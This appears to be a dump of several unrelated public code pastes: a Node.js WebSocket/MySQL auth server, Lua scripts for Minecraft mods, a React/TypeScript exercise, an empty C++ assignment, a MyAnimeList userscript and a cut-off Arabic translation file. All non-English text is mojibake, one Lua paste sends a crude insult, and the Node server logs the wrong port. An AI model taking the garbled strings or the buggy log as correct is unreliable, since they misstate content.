        ""type"": ""user"",
        ""label"": ""jacob""
      },
      ""geometry"": {
        ""coordinates"": [
          14.453172445474792,
          50.09175184463646
        ],
        ""type"": ""Point""
      },
      ""id"": 5
    },
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/IgFsKVj.jpeg"",
        ""type"": ""place""
      },
      ""geometry"": {
        ""coordinates"": [
          14.444167950821793,
          50.10401097106441
        ],
        ""type"": ""Point""
      },
      ""id"": 6
    }
  ]
}"
ZKfXH68m,kek,KiwontaTv,JavaScript,Saturday 25th of May 2024 10:53:09 AM CDT,"const https = require('https');
const mysql = require(""mysql"");
const fs = require(""fs"");
const WebSocket = require('ws');
const config = require('./config.json');
const crc = require('crc');
const http = require('http');

// Load SSL certificate and key
const sslOptions = {
    key: fs.readFileSync('/etc/letsencrypt/live/wss.kiwontatv.de/privkey.pem'),
    cert: fs.readFileSync('/etc/letsencrypt/live/wss.kiwontatv.de/fullchain.pem'),
};

// ALL THE PEOPLE WE NEED TO SUSTAIN OUR ETERNAL NEEEEEDS
var people = [];

function formatTimestamp() {
    const now = new Date();

    const pad = (num) => String(num).padStart(2, '0');

    const day = pad(now.getDate());
    const month = pad(now.getMonth() + 1); // Months are zero-based in JavaScript
    const year = now.getFullYear();

    const hours = pad(now.getHours());
    const minutes = pad(now.getMinutes());
    const seconds = pad(now.getSeconds());

    return `${day}.${month}.${year} ${hours}:${minutes}:${seconds}`;
}

function log(d) {
    let ts = formatTimestamp()
    console.log(""L: ""+ts+ "" - ""+d)
}

// Connect to MySQL
const connection = mysql.createConnection({
    host: config.mysql.host,
    user: config.mysql.user,
    password: config.mysql.password,
    database: config.mysql.database
});

connection.connect(err => {
    if (err) {
        log(""Error connecting to MySQL database:"", err);
        return;
    }
    log(""Connected to MySQL database"");
});

// Create an HTTPS WSS server
const server = https.createServer(sslOptions);
const wss = new WebSocket.Server({ server });

function getChecksum(ppl) {
    const postData = JSON.stringify({
        key1: 'value1',
        key2: 'value2'
    });

    // Options for the POST request
    const options = {
        hostname: 'teams.modern-gaming.net',
        path: '/pages/board/cardapi.php',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }
    };

    // Create the request
    const req = http.request(options, (res) => {
        console.log(`Status Code: ${res.statusCode}`);

        let data = '';

        // A chunk of data has been received.
        res.on('data', (chunk) => {
            data += chunk;
        });

        // The whole response has been received.
        res.on('end', () => {
            console.log('Response from the server:', data);
        });
    });

    // Handle errors
    req.on('error', (error) => {
        console.error('Error making the POST request:', error);
    });

    // Write data to request body
    req.write(postData);
    req.end();
}

function authentication(data, client) {
    if(!data.sid || !data.secret || !data.board) {
        log(""Authentication to unknown user failed!"");
        return;
    }

    const values = [data.sid, data.secret];
    connection.query(`SELECT * FROM user WHERE steamID=? AND secret=?`, values, (err, result) => {
        if (err) {
            log(""Error inserting message into database:"", err);
            return;
        }
        if (result.length != 1) {
            log(""DOUBELING USERROW ERROR ON ""+data.sid)
            return
        }

        if(!people[data.sid]) {
            people[data.sid] = {
                sid: data.sid,
                authenticatedAt: Date.now(),
                connections: 1,
                client: [client]
            }
            log(`    User ${data.sid} Connected to the WSS for the first time`)
        } else {
            people[data.sid].connections++
            people[data.sid].client.push(client)
            var conns = people[data.sid].connections
            
            log(`    User ${data.sid} has now ${conns} connections to the WSS`)
            console.log(people)
        }

        getChecksum(people[data.sid])

        
/*
        const dd = 'your input string';
        const checksum = crc.crc32(dd);

        console.log(`CRC32 Checksum: ${checksum}`);
*/
    });
}

// Connection property
wss.on('connection', ws => {
    ws.on('message', data => {
        var d = JSON.parse(data)
        if(d) {
            log(`Received communicae of type ${d.type}`)
            switch (d.type) {
                case ""authentication"":
                    authentication(d, ws)
                    break;
            
                default:
                    break;
            }
        } else {
            log(""Received incorrect data: ""+data)
        }
    });

    ws.on('close', () => {
    });
});

// Start the server
server.listen(6942, () => {
    log('Server is running on port 443');
});
"
H6nzqfJp,Mekanism Boiler Saftyvalve,gelatine87,Lua,Saturday 25th of May 2024 10:30:08 AM CDT,"local p = peripheral.wrap(""back"")

local function isHeatedCoolantInCriticalRange(amount, maxCap)
    local upperThreshold = maxCap * 0.9
    local lowerThreshold = maxCap * 0.7

    return amount >= upperThreshold, amount <= lowerThreshold
end

local function drawBar(amount, maxCap, upperThreshold, lowerThreshold)
    local bar = string.char(143)
    local width, height = term.getSize()
    local barLength = width - 2  -- Platz f√ºr die Rahmen
    local fillPercentage = (amount / maxCap)
    local fillLength = math.floor(fillPercentage * barLength)
    local upperMark = math.floor(upperThreshold / maxCap * barLength)
    local lowerMark = math.floor(lowerThreshold / maxCap * barLength)

    term.clear()
    term.setCursorPos(1, 2)

    -- Zeichne den Balken
    term.write(""["")
    for i = 1, barLength do
        if i == upperMark then
            term.setTextColor(colors.red)
            term.write(""|"")  -- Markierung f√ºr upperThreshold
        elseif i == lowerMark then
            term.setTextColor(colors.green)
            term.write(""|"")  -- Markierung f√ºr lowerThreshold
        elseif i <= fillLength then
            if fillPercentage >= 0.9 then
                term.setTextColor(colors.red)  -- F√ºllstand √ºber 90% -> Rot
            elseif fillPercentage < 0.9 then
                term.setTextColor(colors.green)  -- F√ºllstand unter 70% -> Gr√ºn
            else
                term.setTextColor(colors.gray)  -- Normaler Bereich -> Wei√ü
            end
            term.write(bar)
        else
            term.write("" "")
        end
    end
    term.setTextColor(colors.white)
    term.write(""]"")

    -- Debug-Ausgabe
    print(string.format(""\nmaxCap: %d, amount: %d, fillPercentage: %.2f%%"", maxCap, amount, fillPercentage * 100))
end

local currentState = 0
local upperThresholdExceeded = false
local lowerThresholdExceeded = false
term.setBackgroundColor(colors.lightGray)

while true do
    local maxCap = p.getHeatedCoolantCapacity()
    local amount = p.getHeatedCoolant().amount

    local upperThreshold = maxCap * 0.9
    local lowerThreshold = maxCap * 0.7

    -- √úberpr√ºfen, ob maxCap und amount Zahlen sind
    if type(maxCap) ~= ""number"" or type(amount) ~= ""number"" then
        print(""Error: maxCap oder amount sind keine Zahlen"")
    else
        local exceedsUpper, fallsBelowLower = isHeatedCoolantInCriticalRange(amount, maxCap)

        if exceedsUpper and not upperThresholdExceeded then
            upperThresholdExceeded = true
            lowerThresholdExceeded = false
            currentState = 15
            rs.setAnalogOutput(""right"", currentState)
        elseif fallsBelowLower and not lowerThresholdExceeded then
            lowerThresholdExceeded = true
            upperThresholdExceeded = false
            currentState = 0
            rs.setAnalogOutput(""right"", currentState)
        end

        drawBar(amount, maxCap, upperThreshold, lowerThreshold)
    end

    sleep(1)  -- Pause von 1 Sekunde, um die CPU zu schonen
end"
CT4v3JPR,Untitled,RotLenin,TypeScript,Saturday 25th of May 2024 10:03:28 AM CDT,"// –ú—ã –æ–∂–∏–¥–∞–µ–º, —á—Ç–æ –í—ã –∏—Å–ø—Ä–∞–≤–∏—Ç–µ —Å–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫–∏–µ –æ—à–∏–±–∫–∏, —Å–¥–µ–ª–∞–µ—Ç–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç –≤–æ–∑–º–æ–∂–Ω—ã—Ö –∏—Å–∫–ª—é—á–µ–Ω–∏–π –∏ —É–ª—É—á—à–∏—Ç–µ —á–∏—Ç–∞–µ–º–æ—Å—Ç—å –∫–æ–¥–∞.
// –ê —Ç–∞–∫ –∂–µ, –Ω–∞–ø–∏—à–∏—Ç–µ –∫–∞—Å—Ç–æ–º–Ω—ã–π —Ö—É–∫ useThrottle –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ –µ–≥–æ —Ç–∞–º –≥–¥–µ —ç—Ç–æ –Ω—É–∂–Ω–æ. - –Ω–µ –ø—Ä–∏–≥–æ–¥–∏–ª–æ—Å—å, —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ pending
// –ñ–µ–ª–∞—Ç–µ–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ React.memo –∏ React.useCallback —Ç–∞–º –≥–¥–µ —ç—Ç–æ –∏–º–µ–µ—Ç —Å–º—ã—Å–ª.
// –ë—É–¥–µ—Ç –±–æ–ª—å—à–∏–º –ø–ª—é—Å–æ–º, –µ—Å–ª–∏ –í—ã —Å–º–æ–∂–µ—Ç–µ –∑–∞–∫—ç—à–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ —Å–ª—É—á–∞–π–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
// –£–∫–∞–∂–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ —Ç–∏–ø—ã.
// –ü–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –ø—Ä–∏—à–ª–∏—Ç–µ –í–∞—à –≤–∞—Ä–∏–∞–Ω—Ç –≤ https://codesandbox.io

import React, { useState, useCallback } from ""react"";
import type {MouseEvent} from ""react"";

const URL = ""https://jsonplaceholder.typicode.com/users"";

function getRandomInt(min : number, max : number) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

interface Company {
  bs: string;
  catchPhrase: string;
  name: string;
}

interface User {
  id: number;
  email: string;
  name: string;
  phone: string;
  username: string;
  website: string;
  company: Company;
  address: string
}

enum FetchStatus {
    pending = 'pending',
    success = 'success',
    error = 'error',
    null = 'null' // –ø–µ—Ä–≤—ã–π –∑–∞–ø—Ä–æ—Å
}

interface WithPendingProps {
    status : FetchStatus,
}
// –ï—Å–ª–∏ –ø–æ–¥—Ö–æ–¥ —Å –æ–∂–∏–¥–∞–Ω–∏–µ–º –æ—Ç–≤–µ—Ç–∞ –±—É–¥–µ—Ç –ø—Ä–∏–º–µ–Ω—è—Ç—Å—è –ø–æ –ø—Ä–æ–µ–∫—Ç—É - –±—É–¥–µ—Ç –Ω–µ–ø–ª–æ—Ö–æ –≤—ã–Ω–µ—Å—Ç–∏ —ç—Ç–æ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª –æ—Ç–¥–µ–ª—å–Ω–æ
function withPending<T>(WrappedComponent : any) {
    return function (props : T & WithPendingProps) {
        const {status} = props;
        if(status === FetchStatus.pending) {
            return <div>
                <p>–û–∂–∏–¥–∞–π—Ç–µ –∏–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö</p>
            </div>
        }

        if(status === FetchStatus.error) {
            return <div>
                <p>–û–¥–Ω–∞ –æ—à–∏–±–∫–∞ –∏ —Ç—ã –æ—à–∏–±—Å—è !</p>
            </div>
        }

        return <>
            <WrappedComponent {...props} />
        </>
    }
}

interface IUserInfoProps {
    user: User | null;
}
// –ù–µ—Ç —Å–º—ã—Å–ª–∞ –º–µ–º–æ–∏–∑–∏—Ä–æ–≤–∞—Ç—å - —á–∞—Å—Ç–æ –º–µ–Ω—è–µ—Ç—Å—è
function UserInfo({ user }: IUserInfoProps) {
    if(user === null) {
        return <></>
    }

    return <>
        <td>{user.name}</td>
        <td>{user.phone}</td>
    </>
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ–¥ –æ–±–µ—Ä—Ç–∫–æ–π
const UserInfoWithStatus = withPending<IUserInfoProps>(UserInfo)

const App = () => {
    // –¢–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –ø—É—Å—Ç–æ
    const [item, setItem] = useState<User | null>(null);
    // –ú–æ–∂–Ω–æ —É—Å–ª–æ–∂–Ω–∏—Ç—å –∏ –¥–æ–±–∞–≤–∏—Ç—å –≤—Ä–µ–º—è –∂–∏–∑–Ω–∏ –ö—ç—à–∞
    const [cache] = useState<Map<number, User>>(new Map());
    // –¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–∞, –∑–∞–ø—Ä–µ—â–∞–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –µ—â–µ 1 –ø–æ–∫–∞ –ø–µ—Ä–≤—ã–π –Ω–µ –≤–µ—Ä–Ω—É–ª—Å—è —Ç–µ–∫—É—â–∏–π –∑–∞–ø—Ä–æ—Å
    const [isPending, setIsPending] = useState<FetchStatus>(FetchStatus.null);

    // –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–ª—É—á–µ–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –ö—ç—à–∞
    const receiveRandomUser = useCallback(async () => {
      // –ï—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ —Å 1-10. –°–ø–µ—Ü–∏–∞–ª—å–Ω–æ —Å–¥–µ–ª–∞–µ–º —à–∞–Ω—Å –æ—à–∏–±–∫–∏ - —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–∞–±–æ—Ç—É ERROR —Å—Ç–∞—Ç—É—Å–∞
      // TODO: –ú–æ–∂–Ω–æ –ø—Ä–µ–¥—É—Å–º–æ—Ç—Ä–µ—Ç—å —á—Ç–æ–±—ã –Ω–µ —Å–æ–≤–ø–∞–¥–∞–ª —Å –ø–æ—Å–ª–µ–¥–Ω–∏–º, –Ω–æ –Ω–µ –∫—Ä–∏—Ç–∏—á–Ω–æ
      const id = getRandomInt(0, 11);
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –¥–∞–Ω–Ω—ã–µ –≤ Cache
      if(cache.has(id)) {
          setItem(cache.get(id) as User);
          setIsPending(FetchStatus.success);
          return;
      }

      // –ü–æ–ª—É—á–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
      setIsPending(FetchStatus.pending);
      fetch(`${URL}/${id}`)
          .then(res => {
              if(!res.ok) {
                  throw new Error('bad request');
              }
              return res.json() as Promise<User>
          })
          .then(_user => {
              setIsPending(FetchStatus.success);
              cache.set(id, _user)
              setItem(_user);
          })
          .catch(err => {
              console.log(`catch`);
              // –í–æ–∑–º–æ–∂–Ω–æ —Å—Ç–æ–∏—Ç –ø–æ–ª—É—á–∞—Ç—å –∏ –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å –æ—à–∏–±–∫—É –≤ —Ç–µ–ª–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞, —É—Ç–æ—á–Ω–∏—Ç—å —É –ü–ú-–∞ =)
              setIsPending(FetchStatus.error)
          })
    }, [cache, setItem]);

    const handleButtonClick = useCallback((event: MouseEvent<HTMLButtonElement>) => {
        event.stopPropagation();
        receiveRandomUser();
    }, [receiveRandomUser]);

    // Throttle –Ω–µ –Ω—É–∂–µ–Ω –∏–∑-–∑–∞ –Ω–∞–ª–∏—á–∏—è —Å—Ç–∞—Ç—É—Å–∞ –∑–∞–ø—Ä–æ—Å–∞
    // –¢–∞–±–ª–∏—Ü–∞ –≤—ã–Ω–µ—Å–µ–Ω–∞ –æ—Ç–¥–µ–ª—å–Ω–∞, —á—Ç–æ–±—ã –º–µ–Ω—å—à–µ HTML —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –ø–µ—Ä–µ—Ä–∏—Å–æ–≤—ã–≤–∞–ª–æ—Å—å
    // –ß–µ—Å—Ç–Ω–æ –≥–æ–≤–æ—Ä—è –∞–±—Å–æ–ª—é—Ç–Ω–æ –Ω–µ —É–≤–µ—Ä–µ–Ω —á—Ç–æ –¥–æ–±–∏–ª—Å—è —á–µ–≥–æ —Ö–æ—Ç–µ–ª, –Ω–æ –¥–ª—è —Ç–∞–∫–æ–≥–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ –∑–∞–¥—É–º–∞–Ω–Ω—ã–π —Ä–µ—Ñ–∞–∫—Ç–æ—Ä –∏–∑–±—ã—Ç–æ—á–µ–Ω
    return (
      <div>
        <h1>Get a random user</h1>
        <button
            type=""button""
            onClick={handleButtonClick}
            disabled={isPending === FetchStatus.pending}
        >
            get random user
        </button>
          <table>
              <thead>
              <tr>
                  <th>Username</th>
                  <th>Phone number</th>
              </tr>
              </thead>
              <tbody>
              <tr>
                <UserInfoWithStatus user={item} status={isPending}/>
              </tr>
              </tbody>
          </table>
      </div>
  );
}

export default App;"
7NkN0FQU,Ejer8_TP6,orlandoju,C++,Saturday 25th of May 2024 09:56:29 AM CDT,"/*
El due√±o del gimnasio Laragym nos pide que realicemos un programa que les permita cargar todas los entrenamientos de sus 50 clientes, cada registro de entrenamiento contiene:
Numero de Entrenamiento (1 - 9999999)
Cliente (101- 150)
Tipo de Entrenamiento ( 1 - 10 )
Tiempo del Entrenamiento (minutos)

Puede haber varios registros de entrenamiento por cliente. La informaci√≥n no se encuentra agrupada ni ordenada. El fin de la carga de entrenamientos se indica con un n√∫mero de entrenamiento igual a cero, informar:
Por cada cliente, el tiempo total de entrenamiento (expresarlo en horas y minutos, ejemplo 70 minutos se expresar√≠a 1 hora y 10 minutos).
Por cada cliente, los tipos de entrenamiento que realiz√≥.
Por cada cada cliente y tipo de entrenamiento, la cantidad total de minutos entrenados. S√≥lo listar aquellos registros que sean superiores a 0.
El n√∫mero de cliente que m√°s tiempo haya entrenado.
Los tipos de entrenamiento que no se realizaron por ning√∫n cliente.

*/
#include <iostream>
#include <clocale>
using namespace std;


int main(){

	setlocale(LC_ALL, """");





return 0;
}
"
bfg7cH7d,toast,giwdul,Lua,Saturday 25th of May 2024 09:32:40 AM CDT,"local chatBox = peripheral.find(""chatBox"")

chatBox.sendToastToPlayer(""You're a little piece of shit"", ""Achivement"", ""_Lume_"", ""&4&lBoxi"", ""()"", ""&c&l"")"
xXUzD0Qx,Mine No Torch w/ Fuel,Cwackers,Lua,Saturday 25th of May 2024 09:22:59 AM CDT,"local args = {...}

local depth = 65/3
local stripLength = 22
local count = 0
local line = 0

if not #args == 0 then
  print(""Usage: hole"")
  return
end

function strip()
  count = 0
    while turtle.detectDown() do
      turtle.digDown()
      sleep(0.2)
    end
    while turtle.detectUp() do
      turtle.digUp()
      sleep(0.2)
    end
  for i=1,stripLength do
    checkFuel(stripLength)
	count = count + 1
    checkInv()
    while not turtle.forward() do turtle.dig() end
    while turtle.detectUp() do
      turtle.digUp()
      sleep(0.2)
    end
    while turtle.detectDown() do
      turtle.digDown()
      sleep(0.2)
    end
  end
end

function checkInv()
  isFull = true
  
  for i=1,15 do
    if turtle.getItemCount(i) == 0 then
      isFull = false
    end
  end
  
  if isFull == true then
	emptyInv()
  end
end

function checkFuel(count)
  if turtle.getFuelLevel() <= count then
    print(""Error: Low fuel"")
    for i=1,15 do
      turtle.select(i)
      turtle.refuel()
    end
    turtle.select(1)
  end
end

function emptyInv()
	turtle.select(16)
   	while not turtle.placeUp() do turtle.digUp() end
   	for i=1,15 do
      	turtle.select(i)
      	turtle.dropUp()
   	end
	turtle.select(1)
end

for q=1, depth do
for x=1,(stripLength/2) do
  turtle.turnLeft()
  strip()
  turtle.turnRight()

  while not turtle.forward() do turtle.dig() end
    while turtle.detectUp() do
      turtle.digUp()
      sleep(0.2)
  end
  turtle.turnRight()

  strip()
  turtle.turnLeft()
  while not turtle.forward() do turtle.dig() end
    while turtle.detectUp() do
      turtle.digUp()
      sleep(0.2)
    end
    while turtle.detectDown() do
      turtle.digDown()
    end
  line = line + 1
end

turtle.turnLeft()
turtle.turnLeft()
turtle.forward()
for x=1,3 do
	while not turtle.down() do turtle.digDown() end
end
turtle.turnRight()
end

emptyInv()"
MTcrX0uZ,RelationFixer.js,RobbiRobb,JavaScript,Saturday 25th of May 2024 08:39:36 AM CDT,"// ==UserScript==
// @name         RelationFixer
// @namespace    https://myanimelist.net/profile/RobbiRobb
// @version      0.1
// @description  displays relations on anime and manga in a more classical layout because the official one sucks
// @author       RobbiRobb
// @match        https://myanimelist.net/anime/*
// @match        https://myanimelist.net/manga/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=myanimelist.net
// @grant        none
// @require      https://code.jquery.com/jquery-3.7.1.min.js
// ==/UserScript==

(function() {
    'use strict';
	
	function appendList(relations, listElement) {
		for(const key of Object.keys(relations).sort().reverse()) {
			const row = $(""<tr></tr>"");
			const typeTD = $('<td class=""ar fw-n borderClass nowrap"" valign=""top""></td>').text(key + "":"");
			const listTD = $('<td class=""borderClass"" width=""100%"">');
			const entryList = $('<ul class=""entries""></ul>');
			
			for(const entry of relations[key]) {
				entryList.append($(""<li></li>"").html(entry.title.html() + entry.type));
			}
			
			listTD.append(entryList);
			row.append(typeTD);
			row.append(listTD);
			
			$(listElement).prepend(row);
		}
	}

	if($("".entries-tile"").length !== 0) {
		const relations = {};
		
		$("".entries-tile .entry"").each((index, el) => {
			const type = $(el).find("".content .relation"").text().trim();
			
			if(type == """") return;
			if(relations[type.split(""\n"")[0].trim()] == undefined) relations[type.split(""\n"")[0].trim()] = [];
			
			relations[type.split(""\n"")[0].trim()].push({
				title: $(el).find("".content .title""),
				type: type.split(""\n"")[1].trim()
			});
		});
		
		if($("".entries-table > tbody"").length == 0) {
			const tbody = $('<tbody></tbody>');
			appendList(relations, tbody);
			const table = $('<table class=""entries-table""></table>').append(tbody);
			
			$("".related-entries"").each((index, el) => {
				$(el).append(table);
			})
		} else {
			$("".entries-table > tbody"").each((index, el) => {
				appendList(relations, el);
			});
		}
	}
	
	const style = $(""<style></style>"").text(`
		.ar.mt4,
		.entries-tile {
			display: none !important;
		}
		
		.entries-table .hide-entry {
			display: table-row !important;
		}
	`);
	
	$(document.head).append(style);
})();"
HKs6cbGd,TTS decrypto arabic translation,ZKlack,JSON,Saturday 25th of May 2024 08:24:45 AM CDT,"{
  ""lang_name"": ""ÿπÿ±ÿ®Ÿä"",
  ""teams"": {
    ""Black"": ""ÿ£ÿ≥ŸàÿØ"",
    ""White"": ""ÿ£ÿ®Ÿäÿ∂""
  },
  ""language"": ""ŸÑÿ∫ÿ©"",
  ""other_languages"": ""ŸÑÿ∫ÿßÿ™ ÿßÿÆÿ±Ÿâ"",
  ""other_languages_link"": ""ÿßŸÑÿµŸÇ ÿßŸÑÿ±ÿßÿ®ÿ∑ ŸáŸÜÿß"",
  ""other_languages_submit"": ""ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ±ÿßÿ®ÿ∑"",
  ""controls_header"": ""ÿ∂ÿ®ÿ∑ ÿßŸÑŸÑÿπÿ®ÿ©"",
  ""start_game"": ""ÿßÿ®ÿØÿ£ ŸÑÿπÿ®ÿ© ÿ¨ÿØŸäÿØŸá"",
  ""configurations"": {
    ""animation_speed"": ""ÿ≥ÿ±ÿπÿ© ÿßŸÑÿ±ÿ≥ŸÖ x%s"",
    ""randomize_teams_yes"": ""ÿßŸÅÿ±ŸÇÿ© ÿπÿ¥Ÿàÿßÿ¶Ÿäÿ©: ŸÜÿπŸÖ"",
    ""randomize_teams_no"": ""ÿßŸÅÿ±ŸÇÿ© ÿπÿ¥Ÿàÿßÿ¶Ÿäÿ©: ŸÑÿß"",
    ""encryptor_timer_yes"": ""ÿ≠ÿØ ŸàŸÇÿ™ ŸÅŸÉ ÿßŸÑÿ¥ŸÅÿ±ÿ©: ŸÜÿπŸÖ"",
    ""encryptor_timer_no"": ""ÿ≠ÿØ ŸàŸÇÿ™ ŸÅŸÉ ÿßŸÑÿ¥ŸÅÿ±ÿ©: ŸÑÿß""
  },
  ""team_reveal"": ""ŸÅÿ±ŸäŸÇŸÉ ŸáŸà %s"",
  ""panels"": {
    ""our_log"": ""ÿ≥ÿ¨ŸÑÿßÿ™ ŸÅÿ±ŸäŸÇŸÜÿß"",
    ""our_clues"": ""ÿ™ŸÑŸÖŸäÿ≠ÿßÿ™ ŸÅÿ±ŸäŸÇŸÜÿß"",
    ""opposing_log"": ""ÿ≥ÿ¨ŸÑÿßÿ™ ŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ"",
    ""opposing_clues"": ""ÿ™ŸÑŸÖŸäÿ≠ÿßÿ™ ŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ"",
    ""guessing"": ""ŸÅŸÉ ÿßŸÑÿ¥ŸÅÿ±ÿ©"",
    ""guessing_button"": ""ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ¥ŸÅÿ±ÿ©"",
    ""interception"": ""ÿ™ÿØÿÆŸÑ"",
    ""interception_button"": ""ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ™ÿØÿÆŸÑ"",
    ""round"": ""ÿßŸÑÿØŸàÿ± %s"",
    ""final_tiebreaker"": ""ÿ¢ÿÆÿ± ŸÉÿ≥ÿ± ÿ™ÿπÿßÿØŸÑ"",
    ""final_tiebreaker_button"": ""ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ™ÿÆŸÖŸäŸÜ ÿßŸÑÿ£ÿÆŸäÿ±"",
    ""final_tiebreaker_placeholder_1"": ""ÿ™ŸàŸÇÿπ ŸÉŸÑŸÖÿ™ŸáŸÖ ÿßŸÑÿ£ŸàŸÑŸâ"",
    ""final_tiebreaker_placeholder_2"": ""ÿ™ŸàŸÇÿπ ŸÉŸÑŸÖÿ™ŸáŸÖ ÿßŸÑÿ´ÿßŸÜŸäÿ©"",
    ""final_tiebreaker_placeholder_3"": ""ÿ™ŸàŸÇÿπ ŸÉŸÑŸÖÿ™ŸáŸÖ ÿßŸÑÿ´ÿßŸÑÿ´ÿ©"",
    ""final_tiebreaker_placeholder_4"": ""ÿ™ŸàŸÇÿπ ŸÉŸÑŸÖÿ™ŸáŸÖ ÿßŸÑÿ£ÿÆŸäÿ±ÿ©""
  },
  ""vote_has_repeat"": ""ŸÑÿß ŸäŸÖŸÉŸÜ ÿßŸÑÿ™ÿµŸàŸäÿ™ ÿ®ŸÇŸäŸÖ ŸÖŸÉÿ±ÿ±ÿ©"",
  ""hint_panel"": {
    ""insert_clue"": ""ÿßŸÑÿ™ŸÑŸÖŸäÿ≠ ŸÑŸÄ %s. . ."",
    ""submit_clues"": ""ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ™ŸÑŸÖŸäÿ≠ÿßÿ™"",
    ""exceptions"": {
      ""empty_clues"": ""Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑÿ™ŸÑŸÖŸäÿ≠ÿßÿ™"",
      ""panel_word_clues"": ""ŸÑÿß ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿ™ŸÑŸÖŸäÿ≠ ŸÖŸÜ ÿßŸÑŸÉŸÑŸÖÿßÿ™ ÿßŸÑÿ≥ÿ±Ÿäÿ©"",
      ""repeat_clues"": ""ŸÑÿß ŸäŸÖŸÉŸÜ ÿ™ŸÉÿ±ÿßÿ± ÿßŸÑÿ™ŸÑŸÖŸäÿ≠ÿßÿ™""
    }
  },
  ""messages"": {
    ""minimum_four_players"": ""ÿßŸÑŸÑÿπÿ®ÿ© ÿ™ÿ™ÿ∑ŸÑÿ® ÿßÿ±ÿ®ÿπ ŸÑÿßÿπÿ®ŸäŸÜ ÿßŸà ÿßŸÉÿ´ÿ±"",
    ""hints_submitted"": ""ŸÖÿ¥ŸÅÿ± ŸÅÿ±ŸäŸÇŸÉ ÿßÿØÿÆŸÑ ÿ™ŸÑŸÖŸäÿ≠ÿßÿ™Ÿá"",
    ""hints_submitted_timeout"": ""ŸÜŸÅÿ∞ ÿßŸÑŸàŸÇÿ™ ŸÖŸÜ ŸÖÿ¥ŸÅÿ± ŸÅÿ±ŸäŸÇŸÉ"",
    ""guess_submitted"": ""ÿ™ŸÖ ÿ™ÿ£ŸÉŸäÿØ ŸÅŸÉ ÿ¥ŸÅÿ±ÿ© ŸÅÿ±ŸäŸÇŸÉ"",
    ""opposing_guess_submitted"": ""ÿ™ŸÖ ÿ™ÿ£ŸÉŸäÿØ ŸÅŸÉ ÿ¥ŸÅÿ±ÿ© ŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ"",
    ""interception_hints_submitted"": ""ŸÖÿ¥ŸÅÿ± ŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ ÿßÿØÿÆŸÑ ÿ™ŸÑŸÖŸäÿ≠ÿßÿ™Ÿá"",
    ""interception_hints_submitted_timeout"": ""ŸÜŸÅÿ∞ ÿßŸÑŸàŸÇÿ™ ŸÖŸÜ ŸÖÿ¥ŸÅÿ± ŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ"",
    ""intercept_submitted"": ""ÿ™ŸÖ ÿ™ÿ£ŸÉŸäÿØ ÿ™ÿØÿÆŸÑ ŸÅÿ±ŸäŸÇŸÉ"",
    ""opposing_intercept_submitted"": ""ÿ™ŸÖ ÿ™ÿ£ŸÉŸäÿØ ÿ™ÿØÿÆŸÑ ŸÅÿ±ŸäŸÇ ÿßŸÑÿÆÿµŸÖ"",
    ""final_tiebreaker_guess_submitted"": ""ÿ™ŸÖ ÿßÿØÿÆÿßŸÑ ÿ¢ÿÆÿ± ÿ™ŸàŸÇÿπ ŸÑŸÅÿ±ŸäŸÇŸÉ"",
